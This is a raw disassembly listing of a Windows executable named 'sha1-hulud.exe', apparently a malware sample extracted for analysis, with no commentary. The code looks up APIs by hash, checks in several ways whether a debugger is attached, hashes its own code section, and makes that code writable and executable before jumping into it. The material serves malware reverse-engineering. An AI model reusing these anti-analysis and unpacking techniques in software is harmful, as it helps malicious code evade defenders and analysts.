
../../work/extracted/artifact-0/sha1-hulud.exe:     file format pei-x86-64


Disassembly of section .text:

000000014003c38a <.text+0x3b38a>:
   14003c38a:	push   rbp
   14003c38b:	push   r15
   14003c38d:	push   r14
   14003c38f:	push   r13
   14003c391:	push   r12
   14003c393:	push   rsi
   14003c394:	push   rdi
   14003c395:	push   rbx
   14003c396:	mov    eax,0x1238
   14003c39b:	call   0x14006f950
   14003c3a0:	sub    rsp,rax
   14003c3a3:	lea    rbp,[rsp+0x80]
   14003c3ab:	movaps XMMWORD PTR [rbp+0x11a0],xmm7
   14003c3b2:	movaps XMMWORD PTR [rbp+0x1190],xmm6
   14003c3b9:	mov    QWORD PTR [rbp+0x1188],0xfffffffffffffffe
   14003c3c4:	call   QWORD PTR [rip+0x58286]        # 0x140094650
   14003c3ca:	mov    ecx,eax
   14003c3cc:	xor    eax,eax
   14003c3ce:	lock cmpxchg DWORD PTR [rip+0x5c6b2],ecx        # 0x140098a88
   14003c3d6:	mov    ecx,0x9394fb88
   14003c3db:	mov    edx,0x5170d148
   14003c3e0:	call   0x140064480
   14003c3e5:	test   rax,rax
   14003c3e8:	je     0x14003c3f8
   14003c3ea:	push   0xfffffffffffffffe
   14003c3ec:	pop    rcx
   14003c3ed:	push   0x11
   14003c3ef:	pop    rdx
   14003c3f0:	xor    r8d,r8d
   14003c3f3:	xor    r9d,r9d
   14003c3f6:	call   rax
   14003c3f8:	mov    rax,QWORD PTR gs:0x60
   14003c401:	mov    r12b,BYTE PTR [rax+0x2]
   14003c405:	mov    QWORD PTR [rbp+0x6b0],rax
   14003c40c:	mov    esi,DWORD PTR [rax+0xbc]
   14003c412:	call   0x140065f29
   14003c417:	mov    DWORD PTR [rbp+0x1180],eax
   14003c41d:	lea    rdi,[rbp+0x7d0]
   14003c424:	and    DWORD PTR [rdi],0x0
   14003c427:	mov    rcx,rdi
   14003c42a:	call   0x140066044
   14003c42f:	mov    eax,DWORD PTR [rdi]
   14003c431:	mov    DWORD PTR [rbp+0x1170],eax
   14003c437:	mov    ecx,0x9394fb88
   14003c43c:	mov    edx,0x43b0f7b9
   14003c441:	call   0x140064480
   14003c446:	test   rax,rax
   14003c449:	je     0x14003c486
   14003c44b:	lea    rbx,[rbp+0x7d0]
   14003c452:	and    QWORD PTR [rbx],0x0
   14003c456:	lea    rcx,[rbp+0xd10]
   14003c45d:	and    DWORD PTR [rcx],0x0
   14003c460:	mov    QWORD PTR [rsp+0x20],rcx
   14003c465:	push   0xffffffffffffffff
   14003c467:	pop    rcx
   14003c468:	push   0x7
   14003c46a:	pop    rdx
   14003c46b:	push   0x8
   14003c46d:	pop    r9
   14003c46f:	mov    r8,rbx
   14003c472:	call   rax
   14003c474:	test   eax,eax
   14003c476:	sete   al
   14003c479:	cmp    QWORD PTR [rbx],0x0
   14003c47d:	setne  r13b
   14003c481:	and    r13b,al
   14003c484:	jmp    0x14003c489
   14003c486:	xor    r13d,r13d
   14003c489:	mov    ecx,0x9394fb88
   14003c48e:	mov    edx,0x43b0f7b9
   14003c493:	call   0x140064480
   14003c498:	test   rax,rax
   14003c49b:	je     0x14003c4d8
   14003c49d:	lea    rbx,[rbp+0x7d0]
   14003c4a4:	and    QWORD PTR [rbx],0x0
   14003c4a8:	lea    rcx,[rbp+0xd10]
   14003c4af:	and    DWORD PTR [rcx],0x0
   14003c4b2:	mov    QWORD PTR [rsp+0x20],rcx
   14003c4b7:	push   0xffffffffffffffff
   14003c4b9:	pop    rcx
   14003c4ba:	push   0x1e
   14003c4bc:	pop    rdx
   14003c4bd:	push   0x8
   14003c4bf:	pop    r9
   14003c4c1:	mov    r8,rbx
   14003c4c4:	call   rax
   14003c4c6:	test   eax,eax
   14003c4c8:	sete   al
   14003c4cb:	cmp    QWORD PTR [rbx],0x0
   14003c4cf:	setne  r14b
   14003c4d3:	and    r14b,al
   14003c4d6:	jmp    0x14003c4db
   14003c4d8:	xor    r14d,r14d
   14003c4db:	mov    ecx,0x9394fb88
   14003c4e0:	mov    edx,0x43b0f7b9
   14003c4e5:	call   0x140064480
   14003c4ea:	test   rax,rax
   14003c4ed:	je     0x14003c51e
   14003c4ef:	lea    rbx,[rbp+0xd10]
   14003c4f6:	mov    DWORD PTR [rbx],0x1
   14003c4fc:	and    DWORD PTR [rbp+0x7d0],0x0
   14003c503:	mov    QWORD PTR [rsp+0x20],rdi
   14003c508:	push   0xffffffffffffffff
   14003c50a:	pop    rcx
   14003c50b:	push   0x1f
   14003c50d:	pop    rdx
   14003c50e:	push   0x4
   14003c510:	pop    r9
   14003c512:	mov    r8,rbx
   14003c515:	call   rax
   14003c517:	or     eax,DWORD PTR [rbx]
   14003c519:	sete   bl
   14003c51c:	jmp    0x14003c520
   14003c51e:	xor    ebx,ebx
   14003c520:	mov    ecx,0x9394fb88
   14003c525:	mov    edx,0xf7ab60cc
   14003c52a:	call   0x140064480
   14003c52f:	test   rax,rax
   14003c532:	je     0x14003c572
   14003c534:	lea    rdi,[rbp+0xd10]
   14003c53b:	mov    WORD PTR [rdi],0x100
   14003c540:	lea    r9,[rbp+0x7d0]
   14003c547:	and    DWORD PTR [r9],0x0
   14003c54b:	push   0x23
   14003c54d:	pop    rcx
   14003c54e:	push   0x2
   14003c550:	pop    r8
   14003c552:	mov    rdx,rdi
   14003c555:	call   rax
   14003c557:	test   eax,eax
   14003c559:	sete   al
   14003c55c:	cmp    BYTE PTR [rdi],0x0
   14003c55f:	setne  cl
   14003c562:	cmp    BYTE PTR [rdi+0x1],0x0
   14003c566:	sete   r15b
   14003c56a:	and    r15b,al
   14003c56d:	and    r15b,cl
   14003c570:	jmp    0x14003c575
   14003c572:	xor    r15d,r15d
   14003c575:	lea    rdi,[rbp+0x7d0]
   14003c57c:	mov    rcx,rdi
   14003c57f:	call   0x140066080
   14003c584:	cmp    DWORD PTR [rdi],0x1
   14003c587:	jne    0x14003c592
   14003c589:	cmp    BYTE PTR [rbp+0x7f8],0x0
   14003c590:	jmp    0x14003c5c3
   14003c592:	lea    rdx,[rbp+0x7d0]
   14003c599:	mov    ecx,0x4d0
   14003c59e:	xor    eax,eax
   14003c5a0:	mov    rdi,rdx
   14003c5a3:	rep stos BYTE PTR [rdi],al
   14003c5a5:	mov    DWORD PTR [rdx+0x30],0x100010
   14003c5ac:	mov    rcx,rdx
   14003c5af:	call   0x140065e00
   14003c5b4:	test   eax,eax
   14003c5b6:	je     0x14003c801
   14003c5bc:	cmp    BYTE PTR [rbp+0x840],0x0
   14003c5c3:	setne  al
   14003c5c6:	mov    ecx,DWORD PTR [rbp+0x1180]
   14003c5cc:	mov    r8d,DWORD PTR [rbp+0x1170]
   14003c5d3:	test   r12b,r12b
   14003c5d6:	lea    rdx,[rbp+0xd19]
   14003c5dd:	setne  BYTE PTR [rdx-0x9]
   14003c5e1:	test   sil,0x70
   14003c5e5:	setne  BYTE PTR [rdx-0x8]
   14003c5e9:	test   ecx,ecx
   14003c5eb:	setne  BYTE PTR [rdx-0x7]
   14003c5ef:	test   r8d,r8d
   14003c5f2:	setne  BYTE PTR [rdx-0x6]
   14003c5f6:	mov    BYTE PTR [rdx-0x5],r13b
   14003c5fa:	mov    BYTE PTR [rdx-0x4],r14b
   14003c5fe:	mov    BYTE PTR [rdx-0x3],bl
   14003c601:	mov    BYTE PTR [rdx-0x2],r15b
   14003c605:	mov    BYTE PTR [rdx-0x1],al
   14003c608:	lea    rbx,[rbp+0xd10]
   14003c60f:	lea    rcx,[rbp+0x7d0]
   14003c616:	mov    QWORD PTR [rcx],rbx
   14003c619:	mov    QWORD PTR [rcx+0x8],rdx
   14003c61d:	call   0x14003c33b
   14003c622:	test   al,al
   14003c624:	jne    0x14003cae4
   14003c62a:	movabs rax,0xf32384f6208f383f
   14003c634:	lea    rcx,[rbp+0x7d0]
   14003c63b:	mov    QWORD PTR [rcx],rax
   14003c63e:	lea    rax,[rip+0x4bd7b]        # 0x1400883c0
   14003c645:	mov    QWORD PTR [rbp+0x160],rax
   14003c64c:	push   0x11
   14003c64e:	pop    rax
   14003c64f:	mov    QWORD PTR [rbp+0x168],rax
   14003c656:	lea    rcx,[rip+0x4bd74]        # 0x1400883d1
   14003c65d:	mov    QWORD PTR [rbp+0x170],rcx
   14003c664:	mov    QWORD PTR [rbp+0x178],rax
   14003c66b:	mov    eax,DWORD PTR [rip+0x5b9ff]        # 0x140098070
   14003c671:	test   eax,eax
   14003c673:	jne    0x14003d408
   14003c679:	lea    rsi,[rbp+0x7d0]
   14003c680:	lea    rdx,[rbp+0x160]
   14003c687:	mov    rcx,rsi
   14003c68a:	call   0x14005dc8a
   14003c68f:	mov    rdi,QWORD PTR [rsi+0x8]
   14003c693:	mov    r8,QWORD PTR [rsi+0x10]
   14003c697:	mov    rcx,rbx
   14003c69a:	mov    rdx,rdi
   14003c69d:	call   0x14005a3e0
   14003c6a2:	lea    rsi,[rbp+0x1060]
   14003c6a9:	mov    QWORD PTR [rsi],rbx
   14003c6ac:	lea    rax,[rip+0xfffffffffffffb0d]        # 0x14003c1c0
   14003c6b3:	mov    QWORD PTR [rsi+0x8],rax
   14003c6b7:	lea    rcx,[rip+0x5b97a]        # 0x140098038
   14003c6be:	lea    rdx,[rip+0x4bd1d]        # 0x1400883e2
   14003c6c5:	mov    r8,rsi
   14003c6c8:	call   0x14006ec60
   14003c6cd:	test   rax,rax
   14003c6d0:	je     0x14003c6da
   14003c6d2:	mov    rcx,rax
   14003c6d5:	call   0x14003bccc
   14003c6da:	mov    rcx,QWORD PTR [rbp+0xd10]
   14003c6e1:	mov    rdx,QWORD PTR [rbp+0xd18]
   14003c6e8:	call   0x14003bd28
   14003c6ed:	mov    rcx,QWORD PTR [rbp+0x7d0]
   14003c6f4:	mov    rdx,rdi
   14003c6f7:	call   0x14006f7f7
   14003c6fc:	lea    rdi,[rbp+0x190]
   14003c703:	and    QWORD PTR [rdi],0x0
   14003c707:	mov    QWORD PTR [rdi+0x8],0x1
   14003c70f:	and    QWORD PTR [rdi+0x10],0x0
   14003c714:	call   0x14006ebd0
   14003c719:	mov    rcx,rdi
   14003c71c:	call   0x14006d680
   14003c721:	mov    rdi,rax
   14003c724:	mov    rcx,rax
   14003c727:	call   0x14003bd70
   14003c72c:	test   rdi,rdi
   14003c72f:	jne    0x14003cad1
   14003c735:	mov    rcx,QWORD PTR [rbp+0x198]
   14003c73c:	mov    rdx,QWORD PTR [rbp+0x1a0]
   14003c743:	push   0xa
   14003c745:	pop    r8
   14003c747:	call   0x14003be92
   14003c74c:	push   0xd
   14003c74e:	pop    r8
   14003c750:	mov    rcx,rax
   14003c753:	call   0x14003be92
   14003c758:	mov    QWORD PTR [rbp+0x1148],rax
   14003c75f:	mov    QWORD PTR [rbp+0x180],rax
   14003c766:	mov    QWORD PTR [rbp+0x4d0],rdx
   14003c76d:	mov    QWORD PTR [rbp+0x188],rdx
   14003c774:	mov    rax,QWORD PTR [rbp+0x6b0]
   14003c77b:	mov    cl,BYTE PTR [rax+0x2]
   14003c77e:	mov    BYTE PTR [rbp+0x1170],cl
   14003c784:	mov    eax,DWORD PTR [rax+0xbc]
   14003c78a:	mov    DWORD PTR [rbp+0x1180],eax
   14003c790:	call   0x140065f29
   14003c795:	mov    DWORD PTR [rbp+0x1178],eax
   14003c79b:	lea    rdi,[rbp+0x7d0]
   14003c7a2:	and    DWORD PTR [rdi],0x0
   14003c7a5:	mov    rcx,rdi
   14003c7a8:	call   0x140066044
   14003c7ad:	mov    eax,DWORD PTR [rdi]
   14003c7af:	mov    DWORD PTR [rbp+0x1168],eax
   14003c7b5:	mov    ecx,0x9394fb88
   14003c7ba:	mov    edx,0x43b0f7b9
   14003c7bf:	call   0x140064480
   14003c7c4:	test   rax,rax
   14003c7c7:	je     0x14003c808
   14003c7c9:	lea    r14,[rbp+0x7d0]
   14003c7d0:	and    QWORD PTR [r14],0x0
   14003c7d4:	and    DWORD PTR [rbp+0xd10],0x0
   14003c7db:	mov    QWORD PTR [rsp+0x20],rbx
   14003c7e0:	push   0xffffffffffffffff
   14003c7e2:	pop    rcx
   14003c7e3:	push   0x7
   14003c7e5:	pop    rdx
   14003c7e6:	push   0x8
   14003c7e8:	pop    r9
   14003c7ea:	mov    r8,r14
   14003c7ed:	call   rax
   14003c7ef:	test   eax,eax
   14003c7f1:	sete   al
   14003c7f4:	cmp    QWORD PTR [r14],0x0
   14003c7f8:	setne  r15b
   14003c7fc:	and    r15b,al
   14003c7ff:	jmp    0x14003c80b
   14003c801:	xor    eax,eax
   14003c803:	jmp    0x14003c5c6
   14003c808:	xor    r15d,r15d
   14003c80b:	mov    ecx,0x9394fb88
   14003c810:	mov    edx,0x43b0f7b9
   14003c815:	call   0x140064480
   14003c81a:	test   rax,rax
   14003c81d:	je     0x14003c85a
   14003c81f:	lea    r14,[rbp+0x7d0]
   14003c826:	and    QWORD PTR [r14],0x0
   14003c82a:	and    DWORD PTR [rbp+0xd10],0x0
   14003c831:	mov    r13,rbx
   14003c834:	mov    QWORD PTR [rsp+0x20],rbx
   14003c839:	push   0xffffffffffffffff
   14003c83b:	pop    rcx
   14003c83c:	push   0x1e
   14003c83e:	pop    rdx
   14003c83f:	push   0x8
   14003c841:	pop    r9
   14003c843:	mov    r8,r14
   14003c846:	call   rax
   14003c848:	test   eax,eax
   14003c84a:	sete   al
   14003c84d:	cmp    QWORD PTR [r14],0x0
   14003c851:	setne  r12b
   14003c855:	and    r12b,al
   14003c858:	jmp    0x14003c860
   14003c85a:	mov    r13,rbx
   14003c85d:	xor    r12d,r12d
   14003c860:	mov    ecx,0x9394fb88
   14003c865:	mov    edx,0x43b0f7b9
   14003c86a:	call   0x140064480
   14003c86f:	test   rax,rax
   14003c872:	je     0x14003c8a6
   14003c874:	lea    r14,[rbp+0xd10]
   14003c87b:	mov    DWORD PTR [r14],0x1
   14003c882:	and    DWORD PTR [rbp+0x7d0],0x0
   14003c889:	mov    QWORD PTR [rsp+0x20],rdi
   14003c88e:	push   0xffffffffffffffff
   14003c890:	pop    rcx
   14003c891:	push   0x1f
   14003c893:	pop    rdx
   14003c894:	push   0x4
   14003c896:	pop    r9
   14003c898:	mov    r8,r14
   14003c89b:	call   rax
   14003c89d:	or     eax,DWORD PTR [r14]
   14003c8a0:	sete   r14b
   14003c8a4:	jmp    0x14003c8a9
   14003c8a6:	xor    r14d,r14d
   14003c8a9:	mov    ecx,0x9394fb88
   14003c8ae:	mov    edx,0xf7ab60cc
   14003c8b3:	call   0x140064480
   14003c8b8:	test   rax,rax
   14003c8bb:	je     0x14003c8f8
   14003c8bd:	lea    rdi,[rbp+0xd10]
   14003c8c4:	mov    WORD PTR [rdi],0x100
   14003c8c9:	lea    r9,[rbp+0x7d0]
   14003c8d0:	and    DWORD PTR [r9],0x0
   14003c8d4:	push   0x23
   14003c8d6:	pop    rcx
   14003c8d7:	push   0x2
   14003c8d9:	pop    r8
   14003c8db:	mov    rdx,rdi
   14003c8de:	call   rax
   14003c8e0:	test   eax,eax
   14003c8e2:	sete   al
   14003c8e5:	cmp    BYTE PTR [rdi],0x0
   14003c8e8:	setne  cl
   14003c8eb:	cmp    BYTE PTR [rdi+0x1],0x0
   14003c8ef:	sete   bl
   14003c8f2:	and    bl,al
   14003c8f4:	and    bl,cl
   14003c8f6:	jmp    0x14003c8fa
   14003c8f8:	xor    ebx,ebx
   14003c8fa:	lea    rdi,[rbp+0x7d0]
   14003c901:	mov    rcx,rdi
   14003c904:	call   0x140066080
   14003c909:	cmp    DWORD PTR [rdi],0x1
   14003c90c:	jne    0x14003c917
   14003c90e:	cmp    BYTE PTR [rbp+0x7f8],0x0
   14003c915:	jmp    0x14003c948
   14003c917:	lea    rdx,[rbp+0x7d0]
   14003c91e:	mov    ecx,0x4d0
   14003c923:	xor    eax,eax
   14003c925:	mov    rdi,rdx
   14003c928:	rep stos BYTE PTR [rdi],al
   14003c92a:	mov    DWORD PTR [rdx+0x30],0x100010
   14003c931:	mov    rcx,rdx
   14003c934:	call   0x140065e00
   14003c939:	test   eax,eax
   14003c93b:	je     0x14003cabf
   14003c941:	cmp    BYTE PTR [rbp+0x840],0x0
   14003c948:	setne  al
   14003c94b:	lea    rdx,[rbp+0xd19]
   14003c952:	mov    ecx,DWORD PTR [rbp+0x1180]
   14003c958:	mov    r8b,BYTE PTR [rbp+0x1170]
   14003c95f:	mov    r9d,DWORD PTR [rbp+0x1178]
   14003c966:	mov    r10d,DWORD PTR [rbp+0x1168]
   14003c96d:	test   r8b,r8b
   14003c970:	setne  BYTE PTR [rbp+0xd10]
   14003c977:	test   cl,0x70
   14003c97a:	setne  BYTE PTR [rbp+0xd11]
   14003c981:	test   r9d,r9d
   14003c984:	setne  BYTE PTR [rbp+0xd12]
   14003c98b:	test   r10d,r10d
   14003c98e:	setne  BYTE PTR [rbp+0xd13]
   14003c995:	mov    BYTE PTR [rbp+0xd14],r15b
   14003c99c:	mov    BYTE PTR [rbp+0xd15],r12b
   14003c9a3:	mov    BYTE PTR [rbp+0xd16],r14b
   14003c9aa:	mov    BYTE PTR [rbp+0xd17],bl
   14003c9b0:	mov    BYTE PTR [rbp+0xd18],al
   14003c9b6:	lea    rcx,[rbp+0x7d0]
   14003c9bd:	mov    QWORD PTR [rcx],r13
   14003c9c0:	mov    QWORD PTR [rcx+0x8],rdx
   14003c9c4:	call   0x14003c33b
   14003c9c9:	test   al,al
   14003c9cb:	jne    0x14003cad1
   14003c9d1:	call   0x140064168
   14003c9d6:	cmp    rax,0x1
   14003c9da:	jne    0x14003cad1
   14003c9e0:	mov    rdi,rdx
   14003c9e3:	call   0x1400641b3
   14003c9e8:	mov    rcx,rdi
   14003c9eb:	call   0x140064146
   14003c9f0:	cmp    rax,0x1
   14003c9f4:	jne    0x14003cad1
   14003c9fa:	mov    r8,rdx
   14003c9fd:	lea    r9,[rip+0x277af]        # 0x1400641b3
   14003ca04:	sub    r9d,edi
   14003ca07:	lea    rbx,[rbp+0x7d0]
   14003ca0e:	mov    rcx,rbx
   14003ca11:	mov    rdx,rdi
   14003ca14:	call   0x1400665bf
   14003ca19:	mov    r15,QWORD PTR [rbx]
   14003ca1c:	mov    rax,r15
   14003ca1f:	neg    rax
   14003ca22:	jo     0x14003cad1
   14003ca28:	mov    r12,QWORD PTR [rbp+0x7d8]
   14003ca2f:	mov    rdi,QWORD PTR [rbp+0x7e0]
   14003ca36:	call   0x140064168
   14003ca3b:	cmp    rax,0x1
   14003ca3f:	jne    0x14003cac6
   14003ca45:	mov    rbx,rdx
   14003ca48:	call   0x1400641b3
   14003ca4d:	mov    rcx,rbx
   14003ca50:	call   0x140064146
   14003ca55:	cmp    rax,0x1
   14003ca59:	jne    0x14003cac6
   14003ca5b:	mov    r8,rdx
   14003ca5e:	lea    r9,[rip+0x2774e]        # 0x1400641b3
   14003ca65:	sub    r9d,ebx
   14003ca68:	lea    r14,[rbp+0x7d0]
   14003ca6f:	mov    rcx,r14
   14003ca72:	mov    rdx,rbx
   14003ca75:	call   0x140066aac
   14003ca7a:	cmp    BYTE PTR [r14],0x0
   14003ca7e:	je     0x14003cac6
   14003ca80:	mov    rax,QWORD PTR [rbp+0x7d8]
   14003ca87:	mov    QWORD PTR [rbp+0x7c0],rax
   14003ca8e:	mov    rax,QWORD PTR [rbp+0x7e0]
   14003ca95:	mov    QWORD PTR [rbp+0x4f0],rax
   14003ca9c:	xor    eax,eax
   14003ca9e:	cmp    rax,0x40
   14003caa2:	je     0x14003cb06
   14003caa4:	mov    QWORD PTR [rbp+rax*1+0x7d0],0x1
   14003cab0:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   14003cab9:	add    rax,0x10
   14003cabd:	jmp    0x14003ca9e
   14003cabf:	xor    eax,eax
   14003cac1:	jmp    0x14003c94b
   14003cac6:	mov    rcx,r15
   14003cac9:	mov    rdx,r12
   14003cacc:	call   0x14006f7f7
   14003cad1:	mov    rcx,QWORD PTR [rbp+0x190]
   14003cad8:	mov    rdx,QWORD PTR [rbp+0x198]
   14003cadf:	call   0x14006f7f7
   14003cae4:	movaps xmm6,XMMWORD PTR [rbp+0x1190]
   14003caeb:	movaps xmm7,XMMWORD PTR [rbp+0x11a0]
   14003caf2:	add    rsp,0x1238
   14003caf9:	pop    rbx
   14003cafa:	pop    rdi
   14003cafb:	pop    rsi
   14003cafc:	pop    r12
   14003cafe:	pop    r13
   14003cb00:	pop    r14
   14003cb02:	pop    r15
   14003cb04:	pop    rbp
   14003cb05:	ret
   14003cb06:	mov    QWORD PTR [rbp+0x1160],r15
   14003cb0d:	mov    QWORD PTR [rbp+0x600],rbx
   14003cb14:	lea    rax,[rbp+0x7e8]
   14003cb1b:	movups xmm0,XMMWORD PTR [rax-0x8]
   14003cb1f:	movups xmm1,XMMWORD PTR [rax+0x8]
   14003cb23:	movups xmm2,XMMWORD PTR [rax+0x18]
   14003cb27:	movups XMMWORD PTR [rbp+0x1090],xmm2
   14003cb2e:	movups XMMWORD PTR [rbp+0x1080],xmm1
   14003cb35:	movups XMMWORD PTR [rbp+0x1070],xmm0
   14003cb3c:	mov    QWORD PTR [rbp+0xf60],r12
   14003cb43:	mov    QWORD PTR [rbp+0x1060],r12
   14003cb4a:	mov    QWORD PTR [rbp+0x1068],rdi
   14003cb51:	push   0x1
   14003cb53:	pop    rbx
   14003cb54:	mov    QWORD PTR [rbp+0x10a0],rbx
   14003cb5b:	lea    rax,[rdi+0x9]
   14003cb5f:	mov    r15,rax
   14003cb62:	shr    r15,0x6
   14003cb66:	and    eax,0x3f
   14003cb69:	cmp    rax,rbx
   14003cb6c:	sbb    r15,0xffffffffffffffff
   14003cb70:	mov    QWORD PTR [rbp+0x1140],r15
   14003cb77:	shl    r15,0x6
   14003cb7b:	sub    r15,rdi
   14003cb7e:	shl    rdi,0x3
   14003cb82:	bswap  rdi
   14003cb85:	lea    r13,[r15-0x9]
   14003cb89:	mov    QWORD PTR [rbp+0xd10],rsi
   14003cb90:	mov    QWORD PTR [rbp+0xd18],rbx
   14003cb97:	xorps  xmm6,xmm6
   14003cb9a:	movups XMMWORD PTR [rbp+0xd20],xmm6
   14003cba1:	mov    BYTE PTR [rbp+0xd50],0x1
   14003cba8:	movups XMMWORD PTR [rbp+0xd30],xmm6
   14003cbaf:	mov    QWORD PTR [rbp+0xd40],r13
   14003cbb6:	mov    QWORD PTR [rbp+0xd48],rdi
   14003cbbd:	mov    eax,0x67452301
   14003cbc2:	mov    QWORD PTR [rbp+0x7b8],rax
   14003cbc9:	mov    DWORD PTR [rbp+0x1178],0xefcdab89
   14003cbd3:	mov    DWORD PTR [rbp+0x1158],0x98badcfe
   14003cbdd:	mov    DWORD PTR [rbp+0x1168],0x10325476
   14003cbe7:	mov    DWORD PTR [rbp+0x1170],0xc3d2e1f0
   14003cbf1:	mov    r12b,0x1
   14003cbf4:	lea    rax,[rip+0xfffffffffffc4485]        # 0x140001080
   14003cbfb:	lea    rcx,[rip+0xffffffffffffdf7e]        # 0x14003ab80
   14003cc02:	sub    rcx,rax
   14003cc05:	mov    QWORD PTR [rbp+0x1150],rcx
   14003cc0c:	xor    r14d,r14d
   14003cc0f:	xor    esi,esi
   14003cc11:	xor    edi,edi
   14003cc13:	xor    eax,eax
   14003cc15:	cmp    rax,QWORD PTR [rbp+0x1140]
   14003cc1c:	je     0x14003cee4
   14003cc22:	mov    QWORD PTR [rbp+0x1180],rax
   14003cc29:	movaps XMMWORD PTR [rbp+0x530],xmm6
   14003cc30:	movaps XMMWORD PTR [rbp+0x520],xmm6
   14003cc37:	movaps XMMWORD PTR [rbp+0x510],xmm6
   14003cc3e:	movaps XMMWORD PTR [rbp+0x500],xmm6
   14003cc45:	mov    rax,QWORD PTR [rbp+0x1060]
   14003cc4c:	mov    rcx,QWORD PTR [rbp+0x1068]
   14003cc53:	xor    r8d,r8d
   14003cc56:	cmp    r8,0x40
   14003cc5a:	je     0x14003cce2
   14003cc60:	mov    rdx,r8
   14003cc63:	inc    r8
   14003cc66:	test   rdi,rdi
   14003cc69:	sete   r10b
   14003cc6d:	mov    r9,rsi
   14003cc70:	test   r10b,0x1
   14003cc74:	je     0x14003cc8e
   14003cc76:	xor    esi,esi
   14003cc78:	mov    r10d,0x0
   14003cc7e:	cmp    r9,rcx
   14003cc81:	jae    0x14003cc6d
   14003cc83:	mov    r10b,BYTE PTR [rax+r9*1]
   14003cc87:	inc    r9
   14003cc8a:	xor    edi,edi
   14003cc8c:	jmp    0x14003ccd2
   14003cc8e:	test   r14,r14
   14003cc91:	je     0x14003ccc6
   14003cc93:	lea    r11,[r14+0x1]
   14003cc97:	cmp    r14,r13
   14003cc9a:	jbe    0x14003ccb8
   14003cc9c:	sub    r14,r15
   14003cc9f:	cmp    r14,0xfffffffffffffff8
   14003cca3:	jb     0x14003ccb8
   14003cca5:	mov    r10b,BYTE PTR [rbp+r14*1+0xd50]
   14003ccad:	xor    r12d,r12d
   14003ccb0:	mov    rdi,rbx
   14003ccb3:	mov    r14,r11
   14003ccb6:	jmp    0x14003ccd2
   14003ccb8:	xor    r12d,r12d
   14003ccbb:	mov    rdi,rbx
   14003ccbe:	mov    r14,r11
   14003ccc1:	xor    r10d,r10d
   14003ccc4:	jmp    0x14003ccd2
   14003ccc6:	mov    r10b,0x80
   14003ccc9:	xor    r12d,r12d
   14003cccc:	mov    rdi,rbx
   14003cccf:	mov    r14,rbx
   14003ccd2:	mov    BYTE PTR [rbp+rdx*1+0x500],r10b
   14003ccda:	mov    rsi,r9
   14003ccdd:	jmp    0x14003cc56
   14003cce2:	mov    BYTE PTR [rbp+0xd50],r12b
   14003cce9:	mov    QWORD PTR [rbp+0xd20],rdi
   14003ccf0:	mov    QWORD PTR [rbp+0xd28],rsi
   14003ccf7:	mov    QWORD PTR [rbp+0xd38],r14
   14003ccfe:	movaps XMMWORD PTR [rbp+0xfb0],xmm6
   14003cd05:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   14003cd0c:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   14003cd13:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   14003cd1a:	xor    eax,eax
   14003cd1c:	cmp    rax,0x40
   14003cd20:	je     0x14003cd38
   14003cd22:	mov    ecx,DWORD PTR [rbp+rax*1+0x500]
   14003cd29:	bswap  ecx
   14003cd2b:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   14003cd32:	add    rax,0x4
   14003cd36:	jmp    0x14003cd1c
   14003cd38:	mov    rax,QWORD PTR [rbp+0x7b8]
   14003cd3f:	mov    DWORD PTR [rbp+0x7d0],eax
   14003cd45:	mov    eax,DWORD PTR [rbp+0x1178]
   14003cd4b:	mov    DWORD PTR [rbp+0x7d4],eax
   14003cd51:	mov    eax,DWORD PTR [rbp+0x1158]
   14003cd57:	mov    DWORD PTR [rbp+0x7d8],eax
   14003cd5d:	mov    eax,DWORD PTR [rbp+0x1168]
   14003cd63:	mov    DWORD PTR [rbp+0x7dc],eax
   14003cd69:	mov    eax,DWORD PTR [rbp+0x1170]
   14003cd6f:	mov    DWORD PTR [rbp+0x7e0],eax
   14003cd75:	and    DWORD PTR [rbp+0x7e4],0x0
   14003cd7c:	movaps xmm0,XMMWORD PTR [rbp+0xf80]
   14003cd83:	movaps xmm1,XMMWORD PTR [rbp+0xf90]
   14003cd8a:	movaps xmm2,XMMWORD PTR [rbp+0xfa0]
   14003cd91:	movaps xmm3,XMMWORD PTR [rbp+0xfb0]
   14003cd98:	lea    rax,[rbp+0x7e8]
   14003cd9f:	movups XMMWORD PTR [rax+0x30],xmm3
   14003cda3:	movups XMMWORD PTR [rax+0x20],xmm2
   14003cda7:	movups XMMWORD PTR [rax+0x10],xmm1
   14003cdab:	movups XMMWORD PTR [rax],xmm0
   14003cdae:	call   0x140064214
   14003cdb3:	mov    al,BYTE PTR [rip+0x5bcd4]        # 0x140098a8d
   14003cdb9:	cmp    al,0x1
   14003cdbb:	je     0x14003ce04
   14003cdbd:	movzx  eax,al
   14003cdc0:	cmp    eax,0x2
   14003cdc3:	je     0x14003cece
   14003cdc9:	and    DWORD PTR [rbp+0x400],0x0
   14003cdd0:	lea    rcx,[rip+0xfffffffffffc42a9]        # 0x140001080
   14003cdd7:	mov    rdx,QWORD PTR [rbp+0x1150]
   14003cdde:	push   0x40
   14003cde0:	pop    r8
   14003cde2:	lea    r9,[rbp+0x400]
   14003cde9:	call   QWORD PTR [rip+0x57a19]        # 0x140094808
   14003cdef:	test   eax,eax
   14003cdf1:	sete   cl
   14003cdf4:	inc    cl
   14003cdf6:	mov    BYTE PTR [rip+0x5bc91],cl        # 0x140098a8d
   14003cdfc:	test   eax,eax
   14003cdfe:	je     0x14003cece
   14003ce04:	mov    al,BYTE PTR [rip+0x5bdae]        # 0x140098bb8
   14003ce0a:	cmp    al,0x1
   14003ce0c:	je     0x14003ce35
   14003ce0e:	movzx  eax,al
   14003ce11:	test   eax,eax
   14003ce13:	jne    0x14003cece
   14003ce19:	call   0x140065d51
   14003ce1e:	test   rax,rax
   14003ce21:	sete   cl
   14003ce24:	inc    cl
   14003ce26:	mov    BYTE PTR [rip+0x5bd8c],cl        # 0x140098bb8
   14003ce2c:	test   rax,rax
   14003ce2f:	je     0x14003cece
   14003ce35:	call   0x140064227
   14003ce3a:	mov    eax,0xc8c291de
   14003ce3f:	xchg   DWORD PTR [rip+0x5bc9b],eax        # 0x140098ae0
   14003ce45:	call   QWORD PTR [rip+0x57805]        # 0x140094650
   14003ce4b:	mov    eax,eax
   14003ce4d:	mov    QWORD PTR [rip+0x5b1ac],rax        # 0x140098000
   14003ce54:	lea    rcx,[rbp+0x7d0]
   14003ce5b:	push   0xffffffffffffffff
   14003ce5d:	pop    rdx
   14003ce5e:	call   0x140001080
   14003ce63:	xor    eax,eax
